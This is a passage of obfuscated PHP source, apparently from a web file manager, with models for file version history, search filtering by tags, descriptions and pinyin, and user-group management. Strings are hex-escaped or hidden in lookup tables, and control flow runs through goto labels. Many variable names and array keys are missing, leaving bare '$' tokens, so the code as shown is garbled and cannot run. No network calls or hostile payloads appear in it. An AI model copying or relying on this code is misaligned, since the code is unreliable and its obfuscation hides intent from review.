$[$Ǟ[191]] . $Ǟ[636])); $ = Model($Ǟ[1527])->field($Ǟ[191])->order($Ǟ[2424])->where($벿)->limit($)->select(); $ = array_to_keyvalue($, $Ǟ[12], $Ǟ[191]); if ($ >= $) { $ = Model($Ǟ[1527])->listChildrenDeep($鍥, $, 3); $ = array_merge($, $, array($鍥 . $Ǟ[463])); } $Ȩɐ = array($Ǟ[191] => array($Ǟ[7], array_unique($))); } $ߝ = $this->where($Ȩɐ)->order($Ǟ[2425])->selectPage(); if ($ߝ[$Ǟ[443]][$Ǟ[444]] == 0) { $ߝ[$Ǟ[443]][$Ǟ[444]] = 1; $ߝ[$Ǟ[446]] = array(array($Ǟ[506] => $鍥, $Ǟ[2405] => $[$Ǟ[190]], $Ǟ[1961] => $[$Ǟ[541]], $Ǟ[511] => $Ǟ[2426], $Ǟ[512] => $[$Ǟ[231]], $Ǟ[1963] => $Ǟ[12])); } return $this->eventListParse($ߝ, $鍥); } private function eventListParse($, $ͻ) { $ =& $_SERVER[]; $ձ = $[$[446]]; $ = array_to_keyvalue($ձ, $[12], $[191]); $Ĕߕ = array_to_keyvalue($ձ, $[12], $[2411]); foreach ($ձ as $Ő˰) { $ = $Ő˰[$[540]]; if ($Ő˰[$[33]] == $[643] && isset($[$[1340]])) { $[] = $[$[1340]] . $[12]; $[] = $[$[1341]] . $[12]; } if ($Ő˰[$[33]] == $[2421] && isset($[$[191]])) { $[] = $[$[191]] . $[12]; } } $ = array_merge($, $Ĕߕ, array($ͻ . $[12])); $ = array_unique($); $ = array_unique(array_to_keyvalue($ձ, $[12], $[1586])); $ = Model($[617])->userListInfo($); $ʭ = Model($[927])->sourceListInfo($, !0); foreach ($ձ as &$Ő˰) { if ($Ő˰[$[33]] == $[643] && isset($Ő˰[$[540]][$[1340]])) { $Ő˰[$[540]][$[1340]] = $ʭ[$Ő˰[$[540]][$[1340]]]; $Ő˰[$[540]][$[1341]] = $ʭ[$Ő˰[$[540]][$[1341]]]; } if ($Ő˰[$[33]] == $[2421] && isset($Ő˰[$[540]][$[191]])) { $Ő˰[$[540]][$[191]] = $ʭ[$Ő˰[$[540]][$[191]]]; } $Ő˰[$[90]] = $ʭ[$Ő˰[$[191]]]; $Ő˰[$[2427]] = $ʭ[$Ő˰[$[2411]]]; if ($Ő˰[$[33]] == $[1328]) { $Ő˰[$[2427]] = $Ő˰[$[90]]; $Ő˰[$[2411]] = $Ő˰[$[2427]][$[191]]; $Ő˰[$[90]] = !1; $Ő˰[$[191]] = $[12]; } $Ő˰[$[2350]] = $[$Ő˰[$[1586]]]; } unset($Ő˰); $[$[446]] = $ձ; return $; } public function removeBySource($) { $񘻫 = array($_SERVER[][506] => $); $this->where($񘻫)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\143\x65\x5f\x68\x69\x73\x74\x6f\x72\171"; public function historyCount($) { $ب =& $_SERVER[]; if (!$) { return array(); } if (is_string($) || is_int($)) { $ = array($); } $ = array($ب[191], $ب[943] => $ب[585]); $ښ = array($ب[191] => array($ب[7], $)); $˴ = $this->field($)->where($ښ)->group($ب[191])->select(); return array_to_keyvalue($˴, $ب[191], $ب[585]); } public function addHistory($, $赶 = '') { $¥ =& $_SERVER[]; $٠ = array($¥[506] => $[$¥[191]], $¥[1961] => isset($[$¥[543]]) ? $[$¥[543]] : $[$¥[541]], $¥[558] => $[$¥[557]], $¥[640] => $[$¥[79]], $¥[2428] => $赶); if ($GLOBALS[$¥[6]][$¥[92]][$¥[1401]] >= 1) { $this->historyAutoClear($٠[$¥[191]]); $this->add($٠); } Hook::trigger($¥[2429], $٠); Model($¥[2430])->eventFileEdit($[$¥[191]]); } private function historyAutoClear($) { $ =& $_SERVER[]; $㈦ = Model($[867])->get($[955]); $񨀂 = intval($GLOBALS[$[6]][$[92]][$[1401]]); $ƅõ = $㈦ == $[956] ? min(5, $񨀂) : $񨀂; $ƅõ = $ƅõ <= 0 ? 0 : $ƅõ - 1; if ($ƅõ >= 499) { return; } $ = array($[506] => $); $ڳ = $this->field($[2431])->where($)->order($[2425])->select(); if (!$ڳ || $ƅõ >= count($ڳ)) { return; } $ = array_to_keyvalue($ڳ, $[12], $[487]); $ = array_slice($, $ƅõ); $ɼ = array_to_keyvalue($ڳ, $[12], $[557]); $ɼ = array_slice($ɼ, $ƅõ); if (!$ || !$ɼ) { return; } $ = array($[508] => array($[7], $)); $this->where($)->delete(); Model($[560])->remove($ɼ); } public function listData($鱮) { $ޓ =& $_SERVER[]; $뚖 = array($ޓ[506] => $鱮); $ = $ޓ[2432]; $ = $this->field($)->where($뚖)->order($ޓ[2425])->selectPage(); $this->_listAppendUser($[$ޓ[446]]); $ӛ㊑ = Model($ޓ[867])->get($ޓ[955]); $½ = 5; if ($ӛ㊑ == $ޓ[956]) { $[$ޓ[446]] = array_slice($[$ޓ[446]], 0, $½); $[$ޓ[443]] = array($ޓ[2433] => 1, $ޓ[2434] => 20, $ޓ[2435] => 1, $ޓ[2324] => count($[$ޓ[446]])); } return $; } protected function _listAppendUser(&$͐) { $ʁ =& $_SERVER[]; $Ǐ = array_to_keyvalue($͐, $ʁ[12], $ʁ[1586]); $× = Model($ʁ[617])->userListInfo($Ǐ); foreach ($͐ as &$) { $駄 = $[$ʁ[1586]]; $[$ʁ[541]] = $×[$駄] ? $×[$駄] : !1; } unset($); } public function fileInfo($Ʃᓸ, $ʋŲ = false) { $ӗ =& $_SERVER[]; $ = $this->tablePrefix; $낖 = "{$}\151\x6f\x5f\x66\x69\x6c\x65\40\x66\x69\154\x65\x73\40\x6f\x6e\40\146\x69\154\145\x73\56\146\x69\x6c\x65\111\104\x20\75\40\150\151\x73\x74\157\162\x79\56\x66\x69\154\x65\111\104"; $ՔӝՌ = $this->alias($ӗ[2436])->where(array($ӗ[508] => $Ʃᓸ))->join($낖, $ӗ[2437])->find(); if ($ՔӝՌ && $ʋŲ) { $ = array($ӗ[191] => $ՔӝՌ[$ӗ[191]], $ӗ[487] => array($ӗ[1175], $Ʃᓸ)); $ՔӝՌ[$ӗ[1858]] = $this->where($)->count(); } return $ՔӝՌ; } public function removeItem($ڽ) { $ʝķ =& $_SERVER[]; $㷑 = array($ʝķ[508] => $ڽ); $ = $this->where($㷑)->find(); if ($) { $ = $this->where($㷑)->delete(); Model($ʝķ[560])->remove($[$ʝķ[557]]); return $; } return !1; } public function removeBySource($䏃) { $Ʊ =& $_SERVER[]; if (!$䏃) { return !1; } if (!is_array($䏃)) { $䏃 = array($䏃); } $ߺ = array($Ʊ[506] => array($Ʊ[7], $䏃)); $ = $this->field($Ʊ[558])->where($ߺ)->select(); if ($) { $this->where($ߺ)->delete(); $ = array_to_keyvalue($, $Ʊ[12], $Ʊ[557]); Model($Ʊ[560])->remove($); } return !0; } public function setDetail($, $؇) { $仝Ԝ =& $_SERVER[]; return $this->where(array($仝Ԝ[508] => $))->save(array($仝Ԝ[2428] => $؇)); } public function rollbackToItem($㸛, $ʡ) { $ =& $_SERVER[]; $޳ = Model($[927])->sourceInfo($㸛); $this->addHistory($޳, LNG($[2438])); $ = $this->find($ʡ); $ = array($[557] => $[$[557]], $[79] => $[$[79]], $[88] => time(), $[543] => USER_ID); Model($[927])->where(array($[191] => $㸛))->save($); return $this->where(array($[508] => $ʡ))->delete(); } public function clearSame($ӛ) { $ژ =& $_SERVER[]; $ = $this->listData($ӛ); $¹ = array_to_keyvalue_group($, $ژ[557]); $ = array(); $܅ = array(); foreach ($¹ as $ޏ) { if (!$ޏ || count($ޏ) <= 1) { continue; } foreach ($ޏ as $ѧ) { $[] = $ѧ[$ژ[557]]; $܅[] = $ѧ[$ژ[487]]; } } if (!$܅) { return; } $this->where(array($ژ[487] => array($ژ[7], $܅)))->delete(); Model($ژ[560])->remove($); } public function userSpace() { $咽 =& $_SERVER[]; $ = $this->tablePrefix; $ޢ = array($咽[1961] => USER_ID); $ˑ = "{$}\x69\157\137\x66\x69\x6c\x65\40\146\x69\154\145\163\x20\x6f\x6e\x20\146\151\154\145\163\x2e\146\x69\154\x65\111\104\40\x3d\40\150\x69\163\164\157\x72\x79\56\146\x69\x6c\x65\111\104"; return $this->alias($咽[2436])->where($ޢ)->join($ˑ, $咽[2437])->sum($咽[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($) { $ =& $_SERVER[]; $ = KodIO::fileTypeList(); $ = $[$]; if (!$) { return array(); } $ɍò = $[$[166]]; $ = $[7]; if (!$[$[166]]) { $߷ = array_to_keyvalue($, $[12], $[166]); $ɍò = implode($[50], $߷); $ = $[2439]; } $ = explode($[50], trim($ɍò, $[50])); return array($, $); } public function listPathType($嫏) { $ =& $_SERVER[]; $ = $this->fileTypeWhere($嫏); if (!$) { return array(); } $ = USER_ID; $ = Model($[617])->getInfo($); $ = array($[670] => SourceModel::TYPE_USER, $[604] => array($[635], $[613] . $[$[90]][$[191]] . $[636]), $[671] => $, $[668] => 0, $[669] => $); return $this->listSource($); } public function listSearch($, $ט = 300) { $줂 =& $_SERVER[]; if (isset($[$줂[2273]]) && $[$줂[2273]]) { $[$줂[2273]] = str_replace($줂[474], $줂[2440], trim($[$줂[2273]])); } $֍ = $this->_parseSearchWhere($); if (!isset($֍[$줂[520]])) { $֍[$줂[520]] = 0; } $屦 = $줂[2441]; $ȟ = $֍; $ = $屦; $this->_listSearchBindPinyin($, $֍, $屦); $this->alias($줂[533])->_makeOrder(); $֍ = $this->parseWhereLike($֍); $ = $this->distinct(!0)->field($屦)->where($֍)->selectPage($ט); if ($GLOBALS[$줂[6]][$줂[468]][$줂[469]] && Input::check($[$줂[2273]], $줂[677]) && $[$줂[443]][$줂[428]] == 1 && $[$줂[443]][$줂[444]] == 0) { $ = $this->distinct(!0)->field($屦)->where($ȟ)->limit(1000)->select(); $ = array_page_split($, !1, $ט); } $this->_listSearchFileContent($, $, $, $ȟ); $this->_listSearchDesc($, $, $); $this->_listSearchTag($, $, $); $this->_listSearchGroupTag($, $, $); $this->_listDataApply($[$줂[446]]); $this->_listMake($); return $; } private function _listSearchFileContent(&$ۤ, $ٶ, $, $ź) { $ܲ =& $_SERVER[]; if (!$ٶ[$ܲ[2273]] || $ۤ[$ܲ[443]][$ܲ[428]] > 1) { return; } if (!isset($ź[$ܲ[32]]) || !is_array($ٶ[$ܲ[557]]) || !$ٶ[$ܲ[557]]) { return; } $ź[$ܲ[557]] = array($ܲ[7], $ٶ[$ܲ[557]]); unset($ź[$ܲ[32]]); unset($ٶ[$ܲ[557]]); $ = $this->field($)->where($ź)->limit($ܲ[2442])->select(); $ = array_to_keyvalue($, $ܲ[191], $ܲ[12]); $ = array_to_keyvalue($ۤ[$ܲ[446]], $ܲ[191], $ܲ[12]); $ = array(); foreach ($ as $ => $˵) { if (!$[$]) { $[] = $˵; } } if (!$) { return; } $ۤ[$ܲ[446]] = array_merge($, $ۤ[$ܲ[446]]); $ۤ[$ܲ[443]][$ܲ[444]] += count($); } private function _listSearchTag(&$ٶ, $ŀ, $) { $ =& $_SERVER[]; if (empty($ŀ[$[2136]]) || !in_array($[2443], $ŀ[$[2136]])) { return; } if (!$ŀ[$[2273]] || $ٶ[$[443]][$[428]] > 1) { return; } $ = Model($[2444])->listData(); $Ō = array(); $໡ = $ŀ[$[2273]]; foreach ($ as $ς) { $דƀ = $ς[$[32]]; $⿝ = str_replace($[53], $[12], Pinyin::get($דƀ)); if (stripos($דƀ, $໡) !== !1 || stripos($⿝, $໡) !== !1) { $Ō[] = $ς[$[487]]; } } if (!$Ō) { return; } $ = array($[515] => array($[7], $Ō), $[1586] => USER_ID); $ = Model($[517])->field($[87])->where($)->select(); $ = array_to_keyvalue($, $[12], $[87]); $̺ = array_unique($); $this->_listSearchMerge($ٶ, $ŀ, $, $̺); } private function _listSearchDesc(&$ꏮ, $, $) { $ =& $_SERVER[]; if (empty($[$[2136]]) || !in_array($[540], $[$[2136]])) { return; } if (!$[$[2273]] || $ꏮ[$[443]][$[428]] > 1) { return; } $ = array($[95] => $[540], $[451] => array($[473], $[2275] . $[$[2273]] . $[2275])); $펹 = !1; if ($펹) { $݀ = $this->listSearchChildren($[$[190]]); $݀ = array_unique($݀); if (!$݀) { return; } $[$[191]] = array($[7], $݀); } $ˌ = Model($[471])->field($[191])->where($)->limit(5000)->select(); $ = array_to_keyvalue($ˌ, $[12], $[191]); $this->_listSearchMerge($ꏮ, $, $, $); } private function _listSearchGroupTag(&$, $, $) { $ =& $_SERVER[]; if (empty($[$[2136]]) || !in_array($[2443], $[$[2136]])) { return; } if (!$[$[2273]] || $[$[443]][$[428]] > 1 || !$[$[190]]) { return; } $믓 = $this->sourceInfo($[$[190]]); if (!$믓 || $믓[$[188]] != SourceModel::TYPE_GROUP) { return; } $ϸ = $믓[$[589]]; $ۊѻ = Model($[2445])->get($ϸ); $ = array(); $ = $[$[2273]]; foreach ($ۊѻ[$[446]] as $ԋԟ) { $ = $ԋԟ[$[32]]; $Ї = str_replace($[53], $[12], Pinyin::get($)); if (stripos($, $) !== !1 || stripos($Ї, $) !== !1) { $[] = $ԋԟ[$[487]]; } } if (!$) { return; } $ = array($[515] => array($[7], $), $[1586] => 0, $[33] => $[1485] . $ϸ); $ = Model($[517])->field($[87])->where($)->select(); $ = array_to_keyvalue($, $[12], $[87]); $ = array_unique($); $this->_listSearchMerge($, $, $, $); } private function _listSearchMerge(&$Ď, $, $Ѱ, $) { $սз =& $_SERVER[]; if (!$) { return; } $򂼖 = array_to_keyvalue($Ď[$սз[446]], $սз[12], $սз[191]); $ = array_diff($, $򂼖); if (!$) { return; } $Щؾ = array($սз[191] => array($սз[7], $)); $ǫ꧁ = $this->field($Ѱ)->where($Щؾ)->select(); if (!$ǫ꧁) { return; } $ϼ = array(); foreach ($ǫ꧁ as $۰) { if ($this->_listSearchFilter($۰, $)) { $ϼ[] = $۰; } } $Ď[$սз[446]] = array_merge($ϼ, $Ď[$սз[446]]); $Ď[$սз[443]][$սз[444]] += count($ϼ); } private function _listSearchFilter($ө, $ٵ) { $ӽ =& $_SERVER[]; $ۂ = $ө[$ӽ[500]] == $ӽ[91]; if (!strstr($ө[$ӽ[604]], $ӽ[50] . $ٵ[$ӽ[190]] . $ӽ[50])) { return !1; } if (isset($ٵ[$ӽ[501]]) && $ٵ[$ӽ[501]] != $ӽ[938]) { if ($ٵ[$ӽ[501]] == $ӽ[78] && !$ۂ) { return !1; } if ($ٵ[$ӽ[501]] != $ӽ[78] && $ۂ) { return !1; } if (!strstr($ө[$ӽ[166]], $ӽ[50] . $ٵ[$ӽ[501]] . $ӽ[50])) { return !1; } } if (isset($ٵ[$ӽ[2446]]) && $ٵ[$ӽ[2446]] < $ө[$ӽ[79]]) { return !1; } if (isset($ٵ[$ӽ[2447]]) && $ٵ[$ӽ[2447]] > $ө[$ӽ[79]]) { return !1; } if (isset($ٵ[$ӽ[684]]) && $ٵ[$ӽ[684]] != $ө[$ӽ[543]]) { return !1; } return !0; } public function listSearchChildren($Ӟ, $ = 5000) { $ᵩ =& $_SERVER[]; $ʹ = array(); $ä = $this->sourceInfo($Ӟ); $ = array($ᵩ[604] => array($ᵩ[473], $ä[$ᵩ[604]] . $ä[$ᵩ[191]] . $ᵩ[636])); $Ϸ = $this->field($ᵩ[79])->where($)->limit($ + 1)->select(); $ߏ = is_array($Ϸ) ? count($Ϸ) : 0; if ($ߏ > $) { return $this->listChildrenDeep($Ӟ, $, 3); } $Ŝ = $this->field($ᵩ[191])->where($)->select(); $ʹ = array_to_keyvalue($Ŝ, $ᵩ[12], $ᵩ[191]); return $ʹ; } public function listChildrenDeep($, $Ԙ, $ݏ = 3) { $ =& $_SERVER[]; $׵ = array(); $ = array($); for ($А = 0; $А < $ݏ; $А++) { $鲌 = array($[190] => array($[7], $)); $š = $this->field($[2448])->where($鲌)->select(); $ = array_to_keyvalue(array_filter_by_field($š, $[500], $[91]), $[12], $[191]); $׵ = array_merge($׵, array_to_keyvalue($š, $[12], $[191])); if (!$ || count($׵) >= $Ԙ) { break; } } return array_slice($׵, 0, intval($Ԙ)); } private function _listSearchBindPinyin($ް, &$ˎ, &$) { $Ƕߵ =& $_SERVER[]; if (!isset($ް[$Ƕߵ[2273]]) || !$ް[$Ƕߵ[2273]]) { return; } if (!Input::check($ް[$Ƕߵ[2273]], $Ƕߵ[393]) || strlen($ް[$Ƕߵ[2273]]) < 2) { return; } $ = "\x4c\105\106\x54\x20\112\x4f\x49\116\40{$this->tablePrefix}\151\x6f\137\x73\157\165\x72\143\x65\x5f\155\x65\x74\x61\40\x6d\145\x74\141\x20\x6f\x6e\40\x73\x6f\x75\162\x63\145\56\163\157\x75\162\143\145\111\104\x20\75\40\x6d\x65\x74\x61\x2e\x73\157\165\162\143\x65\x49\x44"; $ = array(); $ = str_replace(array($Ƕߵ[285], $Ƕߵ[53], $Ƕߵ[2449]), $Ƕߵ[12], $); $ = $Ƕߵ[525] . str_replace($Ƕߵ[50], $Ƕߵ[526], $); $ߩ = $ˎ[$Ƕߵ[32]]; unset($ˎ[$Ƕߵ[32]]); foreach ($ˎ as $ => $) { $[$Ƕߵ[525] . $] = $; } foreach ($ߩ as $쀄) { $[] = array($Ƕߵ[530] => $쀄, $Ƕߵ[1162] => $Ƕߵ[2277], array($Ƕߵ[2450] => $쀄, $Ƕߵ[2451] => array($Ƕߵ[7], array($Ƕߵ[552], $Ƕߵ[551])))); } $this->join($); $ˎ = $; } private function _parseSearchWhere($) { $ź =& $_SERVER[]; $ॼ = array(); if (isset($[$ź[855]]) && $[$ź[855]]) { $ॼ[$ź[88]] = array($ź[2452], $[$ź[855]]); } if (isset($[$ź[856]]) && $[$ź[856]]) { $ˁ = array($ź[2453], $[$ź[856]]); if ($ॼ[$ź[88]]) { $ॼ[$ź[88]] = array($ॼ[$ź[88]], $ˁ, $ź[2454]); } else { $ॼ[$ź[88]] = $ˁ; } } if (isset($[$ź[2446]]) && $[$ź[2446]] > 0) { $ॼ[$ź[79]] = array($ź[2452], $[$ź[2446]]); } if (isset($[$ź[2447]]) && $[$ź[2447]]) { $ˁ = array($ź[2453], $[$ź[2447]]); if ($ॼ[$ź[79]]) { $ॼ[$ź[79]] = array($ॼ[$ź[79]], $ˁ, $ź[2454]); } else { $ॼ[$ź[79]] = $ˁ; } } if (isset($[$ź[684]]) && $[$ź[684]]) { $ॼ[] = array($ź[543] => $[$ź[684]], $ź[541] => $[$ź[684]], $ź[1162] => $ź[2277]); } if (isset($[$ź[501]]) && $[$ź[501]]) { $ = $[$ź[501]]; if ($ == $ź[78]) { $ॼ[$ź[500]] = 1; } else { if ($ == $ź[2455]) { $ॼ[$ź[500]] = 0; } else { if ($) { $ = is_array($) ? $ : explode($ź[50], $); $ॼ[$ź[501]] = array($ź[507], $); $ॼ[$ź[500]] = 0; } } } } $this->_parseSearchParent($, $ॼ); if (isset($[$ź[2273]]) && trim($[$ź[2273]])) { $Ե = trim($[$ź[2273]]); $ܾ = explode($ź[53], $Ե); if (strlen($Ե) > 2 && (substr($Ե, 0, 1) == $ź[118] && substr($Ե, -1) == $ź[118]) || substr($Ե, 0, 1) == $ź[58] && substr($Ե, -1) == $ź[58]) { $Ե = substr($Ե, 1, -1); $ܾ = array($Ե); } $ॼ[$ź[32]] = array(array($ź[635], $ź[2275] . $Ե . $ź[2275])); if (count($ܾ) > 1) { $ॼ[$ź[32]] = array(); foreach ($ܾ as $Ú) { if (!trim($Ú)) { continue; } $ॼ[$ź[32]][] = array($ź[635], $ź[2275] . trim($Ú) . $ź[2275]); } } } return $ॼ; } private function _parseSearchParent($⃣ڏ, &$) { $ͩ =& $_SERVER[]; if (!isset($⃣ڏ[$ͩ[190]]) || !$⃣ڏ[$ͩ[190]]) { return; } $ = $this->pathInfo($⃣ڏ[$ͩ[190]]); $ = $[$ͩ[190]] . $ͩ[12] === $ͩ[228]; $Ķ靬 = $[$ͩ[188]] == $ͩ[598]; if ($[$ͩ[614]] == $ͩ[615]) { $ֳơ = $this->sourceInfo($⃣ڏ[$ͩ[190]]); $[$ͩ[604]] = $ֳơ[$ͩ[604]]; } $[$ͩ[674]] = array($ͩ[635], $[$ͩ[604]] . $⃣ڏ[$ͩ[190]] . $ͩ[636]); $ = isset($⃣ڏ[$ͩ[2136]]) && in_array($ͩ[598], $⃣ڏ[$ͩ[2136]]); if (!$ || !$Ķ靬 || !$ || !$[$ͩ[502]]) { return; } if (!AuthModel::authCheckRoot($[$ͩ[502]][$ͩ[503]])) { return; } $ = $[$ͩ[589]] . $ͩ[12]; if ($ == $ͩ[91]) { unset($[$ͩ[674]]); $[$ͩ[188]] = self::TYPE_GROUP; return; } $ = Model($ͩ[605])->groupChildrenAll($); $ = count($); if ($ <= 1) { return; } $܋ = array($ͩ[190] => 0, $ͩ[188] => self::TYPE_GROUP, $ͩ[589] => array($ͩ[7], $)); $̌ = $this->field($ͩ[2456])->where($܋)->limit($)->select(); $[$ͩ[674]] = array(); foreach ($̌ as $) { $[$ͩ[674]][] = array($ͩ[635], $ͩ[613] . $[$ͩ[191]] . $ͩ[636]); } $[$ͩ[674]][] = $ͩ[2277]; } } goto B; D: function binCheckBigger($, $) { return $ > $; } $_SERVER[$_SERVER[][3]] = ("\71\62\61\64"."\62\67")+0;$_4729="hsmqn42fg370ltduaibcp68xyrkzjveo951wxt50nase142kqbpcur3iv76og9fhyd8mlwzj5l69bnxvy7";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Σ, $) { $ן =& $_SERVER[]; if (isset(self::$_methodList[$Σ])) { return @call_user_func_array(self::$_methodList[$Σ], $); } else { if (method_exists($this, $Σ)) { return call_user_func_array(array($this, $Σ), $); } else { think_exception(__CLASS__ . $ן[4] . $Σ . $ן[5]); } } } public static function __callStatic($ו, $) { if (isset(self::$_methodListStatic[$ו])) { return call_user_func_array(self::$_methodListStatic[$ו], $); } else { if (method_exists(self, $ו)) { return call_user_func_array(array(self, $ו), $); } else { show_json("{$ו}\x28\51\x20\156\157\x74\x20\x65\170\151\163\164\x3b", !1); } } } public static function addMethod($Ɖٞ, $) { self::$_methodList[$Ɖٞ] = $; } public static function addMethodStatic($, $곋) { self::$_methodListStatic[$] = $곋; } } goto E; EŹѱ: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\x74\141\142\154\145\116\141\x6d\x65" => "\147\x72\157\165\x70\x5f\x6d\145\x74\x61", "\155\145\x74\141\106\151\x65\x6c\144" => "\x67\162\x6f\165\x70\111\104"); protected function cacheFunctionAlias($) { $ =& $_SERVER[]; return array($[2256] => array($[0], $[2257]), $[2258] => array($[0], $[2259])); } protected function ___getInfo($) { $ = $this->getInfoSimple($); if (!$) { return !1; } return $this->_listDataApplyItem($); } protected function ___getInfoSimple($) { $ˤ = array($_SERVER[][1489] => intval($)); $ = $this->where($ˤ)->find(); return is_array($) ? $ : array(); } protected function groupAdd($) { $ٶ橐 =& $_SERVER[]; if (!$[$ٶ橐[190]] && isset($[$ٶ橐[1489]]) && $[$ٶ橐[1489]] == 1) { if ($ = $this->getInfoSimple($[$ٶ橐[1489]], !0)) { return $[$ٶ橐[1489]]; } } else { $ = $this->getInfoSimple($[$ٶ橐[190]]); if (!$) { return !1; } } $ϖ = $ٶ橐[613]; if ($[$ٶ橐[604]]) { $ϖ = $[$ٶ橐[604]] . $[$ٶ橐[1489]] . $ٶ橐[50]; } $Ͱ = array($ٶ橐[509] => $this->groupNameAuto($[$ٶ橐[190]], $[$ٶ橐[32]]), $ٶ橐[492] => $[$ٶ橐[190]], $ٶ橐[674] => $ϖ, $ٶ橐[2260] => $[$ٶ橐[2161]], $ٶ橐[2261] => 0, $ٶ橐[2179] => 0); $[$ٶ橐[32]] = $Ͱ[$ٶ橐[32]]; if (isset($[$ٶ橐[2197]])) { $Ͱ[$ٶ橐[2197]] = $[$ٶ橐[2197]]; } else { $鋐 = $this->max($ٶ橐[2197]); if (!$鋐) { $鋐 = 0; } $Ͱ[$ٶ橐[2197]] = $鋐 + 1; } if (!empty($[$ٶ橐[1489]])) { $Ͱ[$ٶ橐[1489]] = $[$ٶ橐[1489]]; } $Ɲ = $this->add($Ͱ); $this->groupMetaEdit($Ɲ, $); Model($ٶ橐[1527])->groupRootAdd($Ɲ); $this->_clearCache($[$ٶ橐[190]]); return $Ɲ; } protected function groupEdit($Ĳ, $) { $ =& $_SERVER[]; $ = $this->getInfoSimple($Ĳ); if (!$) { return !1; } if (!empty($[$[190]])) { $ʜ = $this->getInfoSimple($[$[190]]); if (!$ʜ) { return !1; } if ($[$[1489]] == $ʜ[$[1489]]) { return !1; } if ($[$[190]] != $[$[190]]) { if ($ʜ[$[604]] !== $[$[604]] && strpos($ʜ[$[604]], $[$[604]] . $[$[1489]] . $[50]) === 0) { return !1; } $[$[674]] = $ʜ[$[604]] . $[$[190]] . $[50]; $this->_changeChildLevel($, $ʜ); $this->_clearCache($ʜ[$[1489]]); $this->_clearCache($[$[190]]); } } $this->groupMetaEdit($Ĳ, $); $this->_clearChildrenCache($); return $this->where(array($[2262] => $Ĳ))->save($); } private function groupMetaEdit($, &$) { $ =& $_SERVER[]; if (isset($[$[32]])) { $this->setNamePinyin($, $[$[32]]); } if (isset($[$[2263]])) { $֫ = array($[2263] => $[$[2263]], $[2264] => $[$[2264]]); unset($[$[2263]]); unset($[$[2264]]); if (isset($[$[2265]])) { $ = $[1485] . $; $ = $[1484]; $ = $[$[2265]] ? $[$[2265]] : $[12]; $ջ = Model($[1483])->get($, $); $ջ = $ջ ? $ջ : $[12]; if ($ջ != $) { if (!$ && $ջ) { Model($[1483])->remove($, $); } else { if ($) { Model($[1483])->set($, $, $); } } } $֫[$[2265]] = $; } $this->metaSet($, $֫); } } private function _clearChildrenCache($⇹) { $و =& $_SERVER[]; $ = array($و[674] => array($و[635], $⇹[$و[604]] . $⇹[$و[1489]] . $و[636])); $˅ = $this->field($و[1489])->where($)->select(); foreach ($˅ as $ʏ) { $this->_clearCache($ʏ[$و[1489]]); } } private function _clearCache($͓) { $ =& $_SERVER[]; $this->cacheFunctionClear($[2266], $͓); $this->cacheFunctionClear($[2267], $͓); } private function _changeChildLevel($, $ü, $ = false) { $ɸ =& $_SERVER[]; $С = $[$ɸ[604]] . $[$ɸ[1489]] . $ɸ[50]; $݂ = $ü[$ɸ[604]] . $ü[$ɸ[1489]] . $ɸ[50] . $[$ɸ[1489]] . $ɸ[50]; if ($) { $݂ = $ü[$ɸ[604]] . $ü[$ɸ[1489]] . $ɸ[50]; } $ߟ = array($ɸ[674] => array($ɸ[635], $[$ɸ[604]] . $[$ɸ[1489]] . $ɸ[636])); $ = array($ɸ[674] => array($ɸ[683], "\162\145\x70\154\x61\x63\x65\x28\160\141\162\145\x6e\164\x4c\x65\x76\145\x6c\54\47{$С}\47\x2c\x27{$݂}\47\x29")); $this->_clearChildrenCache($); $this->where($ߟ)->data($)->save(); } public function setNamePinyin($, $妓 = false) { $ =& $_SERVER[]; if (!$妓) { $ = $this->getInfoSimple($); $妓 = $[$[32]]; } if (!Input::check($妓, $[677])) { $this->metaSet($, $[552], null); $this->metaSet($, $[551], null); return; } $ = array($[552] => str_replace($[53], $[12], Pinyin::get($妓)), $[551] => Pinyin::get($妓, $[678])); $this->metaSet($, $); } protected function metaSet($ʌ, $ = null, $ = null) { $this->_clearCache($ʌ); return parent::metaSet($ʌ, $, $); } protected function groupStatus($, $ғ) { $Ȕ =& $_SERVER[]; $ = $this->getInfoSimple($); if (!$) { return !1; } $this->_clearCache($); return $this->metaSet($, $Ȕ[844], $ғ); if ($ғ == $Ȕ[91]) { $ɝ = $this->parentLevelArray($[$Ȕ[604]]); } else { } $ɝ[] = $[$Ȕ[1489]]; $ = array(); foreach ($ɝ as $) { $[] = array($Ȕ[1489] => $, $Ȕ[95] => $Ȕ[844], $Ȕ[451] => $ғ); $this->_clearCache($); } return Model($Ȕ[2268])->addAll($, array(), !0); } protected function groupRemove($ᮜи, $ = false) { $խ =& $_SERVER[]; $᳆ = array($խ[1489] => $ᮜи); $ݑ = $this->where($᳆)->find(); if (!$ݑ || $ݑ[$խ[190]] == 0) { return !1; } if (!$) { $ͮ = $this->getInfoSimple($ݑ[$խ[190]]); $this->_changeChildLevel($ݑ, $ͮ, !0); $this->where(array($խ[190] => $ᮜи))->save(array($խ[190] => $ݑ[$խ[190]])); $this->_clearCache($ͮ[$խ[1489]]); } Model($խ[2268])->where($᳆)->delete(); Model($խ[2269])->where($᳆)->delete(); Model($խ[927])->groupRootRemove($ᮜи); $this->_clearCache($ݑ[$խ[190]]); return $this->where($᳆)->delete(); } protected function groupSort($܃) { $⩯ =& $_SERVER[]; $礞 = array(); foreach ($܃ as $ģ => $ķ) { $礞[] = array($⩯[1489], $ķ, $⩯[2197], $ģ + 1); } $this->saveAll($礞); } public function listData() { $ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($[$_SERVER[][446]]); return $; } private function _makeOrder($ = '') { $ =& $_SERVER[]; $ = array($[1489], $[32], $[2163], $[231]); $ = array($[537] => $[538], $[539] => $[540]); $ = Input::get($[544], $[7], $[2179], $); $໯ = Input::get($[545], $[7], $[2270], array($[2270], $[539])); $໯ = $[$໯]; $ = $ . "{$}\40{$໯}\x2c\40\147\x72\x6f\165\160\111\104\x20\141\x73\x63"; return $this->order($); } public function listChild($ࡳ) { $ =& $_SERVER[]; $ꤑ = $this->where(array($[190] => $ࡳ))->_makeOrder()->selectPage(200); $this->_listDataApply($ꤑ[$[446]]); return $ꤑ; } public function listChildIds($Ā) { $܊ =& $_SERVER[]; if (is_string($)) { $Ā = explode($܊[50], $Ā); } $ݞ = $this->where(array($܊[1489] => array($܊[7], $Ā)))->field($܊[2271])->select(); if 